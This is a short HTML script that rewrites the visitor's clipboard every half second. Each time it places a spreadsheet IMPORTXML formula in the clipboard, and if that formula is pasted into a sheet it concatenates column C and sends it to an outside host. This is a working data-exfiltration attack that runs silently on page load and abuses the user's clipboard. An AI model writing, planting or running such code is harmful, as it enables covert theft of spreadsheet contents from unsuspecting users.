<script>
function setClipboard(text) {
    var typetext = "text/plain"; var blobtext = new Blob([text], { type: typetext });
    var data = [new ClipboardItem({ [typetext]: blobtext })]; //  

    navigator.clipboard.write(data).then(
        function () {
           console.log("setting clipboard succeeded");
        },
        function (err) {
           console.log("setting clipboard failed", err);

        }
    );
}

var i = 0;
function prepareClipboard() {
  i+= 1
  setClipboard('=IMPORTXML(CONCAT("https://gcp.geza.cloudns.cl:1234/'+i+'/";CONCATENATE($C:$C)); "/root")')
}

setInterval(prepareClipboard, 500)

</script>
